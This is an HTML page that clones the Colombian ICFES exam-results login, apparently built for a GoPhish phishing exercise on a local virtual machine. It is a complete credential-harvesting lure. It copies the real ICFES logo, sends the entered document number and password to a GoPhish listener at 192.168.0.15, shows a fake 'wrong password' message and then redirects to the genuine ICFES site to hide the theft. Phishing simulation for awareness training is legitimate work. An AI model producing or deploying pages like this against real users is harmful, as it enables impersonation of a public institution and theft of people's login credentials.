<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>ICFES - Consulta de Resultados</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #e9eef3;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            padding: 40px;
            border-radius: 10px;
            width: 400px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo img {
            width: 180px;
        }
        h2 {
            text-align: center;
            color: #003366;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
        input[type="submit"] {
            width: 100%;
            padding: 12px;
            background-color: #003366;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
        }
        input[type="submit"]:hover {
            background-color: #0059b3;
        }
        .note {
            text-align: center;
            font-size: 0.9em;
            color: #555;
            margin-top: 15px;
        }
        .error {
            color: red;
            font-size: 0.9em;
            text-align: center;
            margin-top: 15px;
        }
    </style>
    <script>
        function mostrarError(event) {
            event.preventDefault();

            const form = event.target;
            const formData = new FormData(form);

            // Envía datos al listener de GoPhish en la VM
            fetch(form.action, {
                method: "POST",
                body: formData
            });

            // Mostrar mensaje de error
            document.getElementById('formulario').style.display = 'none';
            document.getElementById('mensaje-error').style.display = 'block';

            // Redirigir al portal real del ICFES
            setTimeout(() => {
                window.location.href = "https://www.icfes.gov.co";
            }, 3000);
        }
    </script>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.icfes.gov.co/documents/20143/0/logo-icfes-2021-color.png" alt="Logo ICFES">
        </div>
        <h2>Consulta de Resultados</h2>

        <!-- El action apunta a tu servidor GoPhish en la VM -->
        <form method="POST" action="http://192.168.0.15" id="formulario" onsubmit="mostrarError(event)">
            <label for="usuario">Tipo de documento y número</label>
            <input type="text" name="usuario" id="usuario" placeholder="CC 1234567890" required>

            <label for="clave">Contraseña</label>
            <input type="password" name="clave" id="clave" placeholder="********" required>

            <input type="submit" value="Consultar">
        </form>

        <div id="mensaje-error" class="error" style="display:none;">
            Usuario o contraseña incorrectos. Redirigiendo al portal oficial...
        </div>

        <div class="note">
            ¿Problemas para ingresar? Contacte soporte@icfes.gov.co
        </div>
    </div>
</body>
</html>
